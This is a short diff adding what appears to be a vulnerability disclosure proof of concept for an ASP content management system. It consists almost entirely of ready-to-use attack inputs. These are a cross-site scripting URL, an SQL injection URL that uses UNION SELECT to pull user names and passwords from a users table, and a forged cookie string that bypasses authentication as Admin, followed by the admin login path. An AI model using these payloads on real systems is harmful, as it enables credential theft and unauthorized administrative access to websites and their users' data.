@@ -1,0 +1,13 @@
+cross-site scripting: 
+
+http://www.example.com/cms/_db/compact.asp?CmpctedDB=%3Cscript%3Ealert('XSSed by BugReport.IR')%3C/script%3E
+
+SQL-injection: 
+
+http://www.example.com/cms/?job=kwl&kwrd=WWW.BugReport.IR' union select name,password from tblusers where name not like '%WWW.BugReport.IR
+
+Authentication Bypass: 
+
+RealmCmsUser=cUserfiles=userFiles&cIntallType=BugReportTeam&cDbLocat=in&cSiteName=www.Bugreport.IR&cFolder=%2Fcms&cUniqueID=db&cUserRole=1&cUserName=Admin&cUserID=20
+-Then go to:
+/_RealmAdmin/login.asp
